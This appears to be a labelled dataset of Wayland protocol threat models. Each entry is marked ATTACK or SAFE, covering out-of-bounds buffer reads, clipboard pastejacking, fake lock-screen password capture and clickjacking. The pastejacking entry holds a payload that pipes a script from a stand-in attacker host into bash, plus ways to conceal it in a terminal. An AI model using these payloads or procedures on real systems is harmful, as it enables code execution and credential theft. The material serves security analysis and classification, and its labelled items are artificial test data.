## 1) wl_shm_pool.create_buffer - offset
**Message:** wl_shm_pool.create_buffer
**Target Argument's path:** offset
**Threat Model:**
- **Attack Assumption:**
On a Linux desktop system running a Wayland compositor (e.g., Weston 14.0, Sway 1.9, or any wlroots-based compositor), user applications communicate with the compositor via the Wayland protocol over a Unix domain socket ($XDG_RUNTIME_DIR/wayland-0). The wl_shm (shared memory) interface is the standard mechanism for clients to supply pixel data to the compositor for rendering.
We assume: (i) the attacker has local user-level access and can launch a Wayland client application that connects to the compositor's Unix domain socket; (ii) the compositor implements the wl_shm interface for shared memory buffer allocation as required by the Wayland core protocol; (iii) the compositor does not validate that the buffer memory region [offset, offset + height × stride) falls entirely within the pool's declared size when processing wl_shm_pool.create_buffer — the Wayland protocol specification (wayland.xml) defines create_buffer(offset, width, height, stride, format) but does not mandate server-side bounds checking of the computed buffer extent against the pool size; (iv) the compositor's rendering backend (e.g., Pixman for software compositing or GL texture upload paths) reads pixel data directly from the mmap'd pool region using the client-supplied offset, stride, and dimensions without independent bounds verification; and (v) memory pages adjacent to the pool's mmap region in the compositor's address space may contain other clients' buffer data, compositor-internal rendering state, or previously freed and recycled heap memory.
- **Attacker Capability:**
The attacker can run a Wayland client process and send arbitrary Wayland protocol requests via the compositor's Unix domain socket, including creating shared memory pools (wl_shm.create_pool), buffers (wl_shm_pool.create_buffer), and surfaces (wl_compositor.create_surface).

**Attack Procedure:**
The attacker writes a malicious Wayland client using libwayland-client (or pywayland) that exploits insufficient buffer bounds validation in the compositor:
1. The client calls memfd_create("exploit-pool", 0) to obtain an anonymous shared memory file descriptor, then ftruncate() it to 8192 bytes — this is the legitimate pool backing size.
2. The client sends wl_shm.create_pool(fd, size=8192) to obtain a wl_shm_pool object (ID 10). The compositor mmaps the fd with the declared size of 8192 bytes.
3. The client sends the attack message: wl_shm_pool.create_buffer with offset=4096, width=64, height=64, stride=256, format=argb8888. The buffer requires 64 × 256 = 16384 bytes starting at offset 4096, spanning byte range [4096, 20480). Since the pool is only 8192 bytes, the buffer extends 12288 bytes beyond the pool boundary.
4. If the compositor does not validate that offset + height × stride ≤ pool_size, it creates the wl_buffer object (ID 15) without error and records the client-supplied offset and dimensions.
5. The client creates a wl_surface via wl_compositor.create_surface, attaches the malicious buffer via wl_surface.attach(buffer=15, x=0, y=0), marks damage via wl_surface.damage_buffer(0, 0, 64, 64), and commits with wl_surface.commit.
6. During the next rendering cycle, the compositor's rendering backend reads 16384 bytes of pixel data starting at mmap_base + 4096. Reads beyond mmap_base + 8192 access memory outside the pool's legitimate mapping — this data may include fragments of other clients' surface buffers (if the compositor's allocator reuses adjacent virtual pages), compositor bookkeeping structures such as wl_resource metadata, or stale data from previously freed and recycled heap allocations.
7. Under software compositing (Pixman backend), the out-of-bounds pixel data is composited directly into the output framebuffer and becomes visible on screen, constituting a visual information disclosure. Under GPU-accelerated compositing, the data may be uploaded as a texture, with similar information leakage through the rendered output.

The PoC is successful if the compositor renders the surface without returning a protocol error, displaying pixel data sourced from memory beyond the pool's 8192-byte boundary, thereby demonstrating an out-of-bounds read of compositor-managed memory.

**Attack Message:**
The following is the attack Wayland request represented in a JSON structure. This request is sent from the malicious client to the compositor over the Wayland Unix domain socket.

{
  "wayland_interface": "wl_shm_pool",
  "wayland_request": "create_buffer",
  "object_id": 10,
  "arguments": {
    "offset": 4096,
    "width": 64,
    "height": 64,
    "stride": 256,
    "format": "argb8888"
  },
  "new_id": {
    "id": 15,
    "interface": "wl_buffer"
  }
}

**Classification:**
ATTACK


## 2) wl_data_source.offer - mime_type
**Message:** wl_data_source.offer
**Target Argument's path:** mime_type
**Threat Model:**
- **Attack Assumption:**
On a Linux desktop system running a Wayland session, the wl_data_device_manager and wl_data_device interfaces implement clipboard (selection) and drag-and-drop data transfer between Wayland clients. A client that wishes to provide clipboard content creates a wl_data_source object, advertises available MIME types via repeated wl_data_source.offer calls, and then claims clipboard ownership via wl_data_device.set_selection(source, serial).
We assume: (i) the attacker has local user-level access and can run a Wayland client application; (ii) the attacker's client has recently received at least one input event (keyboard or pointer) from which a valid serial number can be extracted — this serial is required by the Wayland protocol's anti-hijack mechanism in wl_data_device.set_selection; (iii) the victim user regularly copies and pastes text between applications, including pasting into terminal emulators (e.g., GNOME Terminal, Alacritty, kitty, foot); (iv) the Wayland compositor mediates clipboard data transfer between source and receiving clients but does not inspect, sanitize, or validate that clipboard content matches the declared MIME type; and (v) the terminal emulator processes pasted text through its standard input handler, which interprets newlines as command submission and may process embedded ANSI/VT escape sequences — this is the default behavior in virtually all modern terminal emulators.
- **Attacker Capability:**
The attacker can run a Wayland client that creates wl_data_source objects, advertises MIME types via offer requests, claims clipboard ownership via set_selection, and serves crafted content when a paste is requested.

**Attack Procedure:**
The attacker runs a malicious Wayland client that performs a clipboard poisoning (pastejacking) attack:
1. The client binds to wl_seat (via wl_registry) and registers a wl_keyboard listener. Upon receiving any wl_keyboard.key event, the client records the event's serial number for later use.
2. The client creates a wl_data_source via wl_data_device_manager.create_data_source (new object ID 20).
3. The client sends the attack message: wl_data_source.offer(mime_type="text/plain;charset=utf-8"), declaring that the source provides plain text data. The client may also send additional offer requests for "text/plain" and "UTF8_STRING" for broader compatibility.
4. The client sends wl_data_device.set_selection(source=20, serial=<saved_serial>), claiming clipboard ownership. The compositor validates the serial against recent input events and, if valid, replaces the current selection owner with the attacker's data source.
5. At some later time, the victim opens a terminal emulator and presses Ctrl+V or uses a paste shortcut. The compositor sends wl_data_source.send(mime_type="text/plain;charset=utf-8", fd=<pipe_fd>) to the attacker's client, indicating that a paste consumer wants the data.
6. The attacker writes a crafted payload to the pipe fd. The payload exploits the terminal's line-by-line paste behavior: "echo 'verifying package integrity...'\ncurl -s http://attacker.example.com/payload.sh | bash\n#". The first line appears benign in the terminal's scrollback; the embedded newline (\n) causes the terminal to submit each line as a separate command; the final "#" comments out any trailing characters that the terminal might append.
7. Alternatively, the attacker can use ANSI escape sequences to hide the malicious portion: "\x1b[8m" (SGR conceal) before the malicious command and "\x1b[28m" after, making the command invisible in the terminal output while the shell still executes it. Or use Unicode right-to-left override (U+202E) to visually reorder characters in the paste buffer.

The PoC is successful if the victim pastes the clipboard content into a terminal emulator and the attacker's crafted command executes on the victim's system without the victim recognizing the malicious content.

**Attack Message:**
The following is the attack Wayland request represented in a JSON structure. The offer request declares the MIME type; the actual malicious payload is served asynchronously when a paste consumer requests the data.

{
  "wayland_interface": "wl_data_source",
  "wayland_request": "offer",
  "object_id": 20,
  "arguments": {
    "mime_type": "text/plain;charset=utf-8"
  },
  "selection_claim": {
    "wayland_interface": "wl_data_device",
    "wayland_request": "set_selection",
    "object_id": 12,
    "arguments": {
      "source": 20,
      "serial": 54321
    }
  },
  "payload_on_paste": "echo 'verifying package integrity...'\ncurl -s http://attacker.example.com/payload.sh | bash\n#"
}

**Classification:**
ATTACK


## 3) xdg_toplevel.set_fullscreen - output
**Message:** xdg_toplevel.set_fullscreen
**Target Argument's path:** output
**Threat Model:**
- **Attack Assumption:**
On a Linux desktop system running a Wayland session, the xdg-shell protocol (stable version, interfaces xdg_wm_base, xdg_surface, xdg_toplevel) defines the standard window management mechanism. The xdg_toplevel.set_fullscreen request allows any client to request that its window occupy the entire area of a specific output (monitor), covering all other windows, desktop panels, and system UI elements.
We assume: (i) the attacker has local user-level access and can run a Wayland client application; (ii) the Wayland compositor (e.g., Sway, GNOME/Mutter, KDE/KWin, Hyprland) grants fullscreen requests from clients without requiring explicit user confirmation — the xdg-shell protocol specification states that the compositor "is free to ignore" the request, but in practice most compositors honor it to avoid breaking legitimate applications; (iii) the compositor does not display a persistent, unforgeable visual indicator (such as a compositor-rendered trusted border or watermark) distinguishing compositor-drawn system UI from client-rendered content when a window is fullscreen; (iv) the Wayland protocol does not define a "secure attention sequence" (analogous to Windows Ctrl+Alt+Delete or Linux Ctrl+Alt+F1) that guarantees the user is interacting with a compositor-controlled trusted component; and (v) the victim's system uses a Wayland-native screen locker (e.g., swaylock, gtklock, gnome-screensaver under Wayland session) whose visual appearance (background image, password prompt layout, user avatar) can be replicated by any application with access to the same theme resources.
- **Attacker Capability:**
The attacker can run a Wayland client that creates xdg_toplevel surfaces, sets arbitrary app_id and title metadata, requests fullscreen mode targeting a specific output, renders arbitrary pixel content covering the entire display, and receives keyboard input events for the focused surface.

**Attack Procedure:**
The attacker runs a malicious Wayland client that performs a fullscreen phishing attack to steal the user's login credentials:
1. The client performs standard Wayland setup: binds wl_compositor, xdg_wm_base, wl_shm, wl_seat, and wl_output from the registry.
2. The client creates a wl_surface via wl_compositor.create_surface, then obtains xdg_surface via xdg_wm_base.get_xdg_surface and xdg_toplevel via xdg_surface.get_toplevel.
3. The client calls xdg_toplevel.set_app_id("swaylock") (or the compositor's lock screen application name) so that the window appears as the legitimate lock screen in any compositor task-switching or window-list UI.
4. The client sends the attack message: xdg_toplevel.set_fullscreen(output=1), targeting the victim's primary monitor. The compositor transitions the window to fullscreen mode, covering the entire display including any desktop panels, status bars, or notification areas.
5. The client renders a pixel-perfect visual replica of the system lock screen into its surface buffer. Since the client has access to the same GTK/Qt theme, wallpaper images, and font resources, the replica is visually indistinguishable from the real lock screen. The replica includes a functional-looking password input field rendered by the client.
6. The compositor delivers wl_keyboard.enter and subsequent wl_keyboard.key events to the attacker's surface (since it is the focused fullscreen window). The client captures each keystroke, reconstructing the victim's typed password.
7. After capturing the password, the client can exfiltrate it via a network request, then exit fullscreen and destroy its surface — the victim sees their real desktop and assumes they simply unlocked their screen.

The PoC is successful if the attacker's fullscreen window is presented without any compositor-provided visual cue distinguishing it from the real lock screen, and the victim's keystrokes (password) are captured by the attacker's client.

**Attack Message:**
The following is the attack Wayland request represented in a JSON structure. The set_fullscreen request with a target output causes the client's surface to cover the entire display.

{
  "wayland_interface": "xdg_toplevel",
  "wayland_request": "set_fullscreen",
  "object_id": 30,
  "arguments": {
    "output": 1
  },
  "prior_setup": {
    "set_app_id": "swaylock",
    "set_title": "",
    "surface_content": "pixel-perfect replica of system lock screen with password prompt"
  }
}

**Classification:**
ATTACK


## 4) wl_surface.set_input_region - region
**Message:** wl_surface.set_input_region
**Target Argument's path:** region
**Threat Model:**
- **Attack Assumption:**
On a Linux desktop system running a Wayland session, the wl_surface.set_input_region request allows a client to define which portion of its surface accepts input events (pointer clicks, touch, keyboard focus when the pointer is over the surface). Regions outside the defined input region are "transparent" to input — pointer events at those coordinates pass through to whatever surface lies behind in the compositor's stacking order.
We assume: (i) the attacker has local user-level access and can run a Wayland client application; (ii) the compositor implements standard surface stacking and input region handling per the Wayland core protocol specification, where input events are delivered to the topmost surface in the stack whose input region contains the pointer position; (iii) a security-sensitive application is running in a window behind (below in stacking order) the attacker's surface — for example, a browser with an OAuth consent page showing "Authorize" and "Deny" buttons, a system-settings dialog with a "Grant Administrative Access" button, or a package-manager prompt requiring confirmation; (iv) the attacker can position its window to visually overlap the target application's security-sensitive controls (Wayland compositors typically allow clients to request specific positions via xdg_popup or layer-shell protocols, or the attacker arranges overlap through normal window placement); and (v) the compositor does not warn the user about surfaces whose visual extent and input region are significantly mismatched.
- **Attacker Capability:**
The attacker can run a Wayland client that creates surfaces with arbitrary visual content and arbitrary input regions (including empty regions), and can influence surface stacking order through standard Wayland shell protocols.

**Attack Procedure:**
The attacker runs a malicious Wayland client that performs a clickjacking (UI redressing) attack via input region manipulation:
1. The client creates a wl_surface via wl_compositor.create_surface and renders it with content that visually mimics a benign interactive element — for example, a "Click to dismiss" button or a "Not now" label — positioned to precisely overlap the target application's "Authorize" or "Grant Access" button.
2. The client creates an empty wl_region object (ID 41) via wl_compositor.create_region. No rectangles are added to this region, so it represents an empty set.
3. The client sends the attack message: wl_surface.set_input_region(region=41), assigning the empty region as the surface's input region. This makes the surface fully visible but entirely transparent to input events.
4. The client commits the surface state via wl_surface.commit. After the commit, the compositor applies the empty input region: the attacker's surface is rendered at its full extent during compositing, but the compositor's input routing treats every point on the surface as outside its input region.
5. The victim sees the attacker's visual content (e.g., "Click to dismiss this notification") overlaying what appears to be an unrelated area of the screen. The victim clicks on the attacker's visual element, intending to dismiss it.
6. Because the attacker's surface has an empty input region, the compositor does not deliver the click to the attacker. Instead, the hit-test falls through to the next surface in the stacking order — the security-sensitive application behind. The click lands on the "Authorize" button.
7. The victim has unknowingly authorized a privileged action (OAuth token grant, administrative access, package installation) in the target application. The attacker's visual overlay successfully deceived the victim about which application would receive their input.

The PoC is successful if the victim's click, visually targeting the attacker's surface, is instead delivered to a security-sensitive control in a different application behind the attacker's surface due to the empty input region.

**Attack Message:**
The following is the attack Wayland request represented in a JSON structure. The set_input_region request with an empty region makes the surface visually present but input-transparent.

{
  "wayland_interface": "wl_surface",
  "wayland_request": "set_input_region",
  "object_id": 40,
  "arguments": {
    "region": 41
  },
  "region_definition": {
    "wayland_interface": "wl_region",
    "object_id": 41,
    "operations": [],
    "effective_area": "empty (no rectangles added)"
  }
}

**Classification:**
ATTACK


## 5) wl_shm_pool.create_buffer - stride
**Message:** wl_shm_pool.create_buffer
**Target Argument's path:** stride
**Threat Model:**
- **Attack Assumption:**
On a Linux desktop system running a Wayland compositor, the wl_shm_pool.create_buffer request creates a wl_buffer object from a shared memory pool. The stride argument specifies the number of bytes between the start of consecutive rows of pixels in the buffer.
We assume: (i) the attacker can run a Wayland client that creates shared memory pools and buffers; (ii) the attacker manipulates the stride argument to values different from the minimum (width × bytes_per_pixel); and (iii) the pool size is sufficient to contain the buffer at the declared offset (offset + height × stride ≤ pool_size).
- **Attacker Capability:**
The attacker can send wl_shm_pool.create_buffer requests with arbitrary stride values.
**Security Analysis:**
The stride argument in wl_shm_pool.create_buffer specifies the byte distance between the start of consecutive pixel rows. The Wayland protocol requires stride ≥ width × bytes_per_pixel (e.g., stride ≥ width × 4 for argb8888 format); a stride smaller than this minimum causes a protocol error that disconnects the client. Setting stride to a value larger than the minimum simply adds padding bytes between rows — this is standard practice in graphics programming for memory alignment (e.g., aligning rows to 64-byte cache lines or GPU texture alignment requirements). The compositor reads exactly width × bytes_per_pixel bytes from each row and ignores the padding. As long as the buffer's memory extent (offset + height × stride) falls within the pool's declared size, the stride value only affects the memory layout of the attacker's own pixel data. An excessively large stride that would push the buffer beyond pool bounds falls into the out-of-bounds category addressed by the offset/bounds validation issue (Case 1), not a stride-specific vulnerability. Within valid bounds, stride manipulation cannot influence other clients' surfaces, compositor state, input routing, or any cross-client security boundary. It is a client-local rendering layout parameter.

**Classification:**
SAFE


## 6) wl_surface.set_buffer_scale - scale
**Message:** wl_surface.set_buffer_scale
**Target Argument's path:** scale
**Threat Model:**
- **Attack Assumption:**
On a Linux desktop system running a Wayland compositor, wl_surface.set_buffer_scale allows a client to declare the integer scale factor between its buffer's pixel dimensions and the surface's logical dimensions, used for HiDPI display support.
We assume: (i) the attacker can run a Wayland client that creates surfaces and sets buffer properties; (ii) the attacker manipulates the scale argument to extreme values (e.g., 1000) or boundary values (e.g., 1); and (iii) all other surface, buffer, and shell parameters are valid.
- **Attacker Capability:**
The attacker can send wl_surface.set_buffer_scale requests with arbitrary positive integer values.
**Security Analysis:**
The scale argument in wl_surface.set_buffer_scale must be a positive integer greater than zero; sending zero or a negative value is a protocol error that disconnects the offending client. Setting scale to a large value (e.g., 100) causes the compositor to treat the client's buffer as if each buffer pixel spans a 100×100 logical pixel area — the surface's logical size becomes buffer_width/100 × buffer_height/100, resulting in a tiny surface. This affects only the attacker's own surface rendering. The compositor divides the buffer dimensions by the scale to compute logical size; no multiplication or amplification of memory access occurs. The scale value does not influence input event routing to other clients, clipboard handling, surface stacking order, or any cross-client interaction. The compositor's rendering pipeline handles scale as a simple coordinate transformation during texture sampling, which is bounded by the buffer's actual allocated dimensions. It is a purely client-local rendering metadata parameter with no security implications.

**Classification:**
SAFE


## 7) xdg_toplevel.set_title - title
**Message:** xdg_toplevel.set_title
**Target Argument's path:** title
**Threat Model:**
- **Attack Assumption:**
On a Linux desktop system running a Wayland session, xdg_toplevel.set_title sets the window title string displayed by the compositor in title bars, task switchers, and taskbar entries.
We assume: (i) the attacker can run a Wayland client that creates xdg_toplevel surfaces; (ii) the attacker sets the title argument to misleading values (e.g., "System Settings", "Password Manager", or strings containing special Unicode characters, control characters, or extremely long text); and (iii) all other surface, buffer, and shell parameters are normal.
- **Attacker Capability:**
The attacker can send xdg_toplevel.set_title requests with arbitrary UTF-8 string content.
**Security Analysis:**
The title argument in xdg_toplevel.set_title is an opaque UTF-8 string that the compositor uses solely as a display label in window decorations and task management UI. Setting a misleading title (e.g., impersonating a system application) changes only the text label visible in the compositor's title bar and task switcher — it does not grant the attacker's window any additional privileges, protocol capabilities, or access to other clients' data. The Wayland security model does not use window titles for access control, authentication, authorization, or any security decision. While a misleading title could contribute to social engineering (in combination with other techniques like fullscreen phishing), the title alone cannot cause harm: the window's actual process identity, its Wayland protocol capabilities, and its accessible interfaces are entirely unaffected by the title string. Compositors that render server-side decorations control title bar rendering and can truncate, sanitize, or annotate titles. Extremely long titles may cause UI layout issues in the compositor's decoration renderer, but this is a cosmetic concern. The set_title request does not interact with clipboard, input routing, shared memory, or any security-sensitive protocol mechanism.

**Classification:**
SAFE


## 8) wl_data_offer.accept - mime_type
**Message:** wl_data_offer.accept
**Target Argument's path:** mime_type
**Threat Model:**
- **Attack Assumption:**
On a Linux desktop system running a Wayland session, wl_data_offer.accept is sent by a receiving client to indicate which MIME type it prefers to accept from a clipboard or drag-and-drop data offer. This is used primarily for drag-and-drop visual feedback from the data source.
We assume: (i) the attacker runs a malicious Wayland client that manipulates the mime_type argument in wl_data_offer.accept to request unusual, crafted, or non-standard MIME types; (ii) the compositor mediates data transfer between the source client and the receiving client; and (iii) the attacker expects that requesting a specific MIME type will influence how the source client's data is processed or will expose data in an unintended format.
- **Attacker Capability:**
The attacker can send wl_data_offer.accept requests with arbitrary MIME type strings.
**Security Analysis:**
The mime_type argument in wl_data_offer.accept serves as a preference hint for drag-and-drop operations. Per the Wayland protocol specification, this request tells the data source which MIME type the potential drop target currently prefers, enabling the source to update its visual drag feedback (e.g., changing cursor shape). For clipboard paste operations, wl_data_offer.accept is irrelevant — actual data retrieval is performed via the separate wl_data_offer.receive request, which independently specifies the desired MIME type and triggers data transfer through a pipe file descriptor. The accept request does not trigger data transfer, does not cause the source to write data anywhere, and does not expose data from any client. The source client can freely ignore the accepted MIME type. Setting it to an arbitrary or crafted string affects only the source's drag visual feedback — the source may choose to display a "cannot drop" indicator if the MIME type is not in its offered set, or simply ignore it. The request does not bypass the Wayland data transfer security model where the source client controls what data to write and when. It has no effect on the data source, other clients, or the compositor's security state.

**Classification:**
SAFE
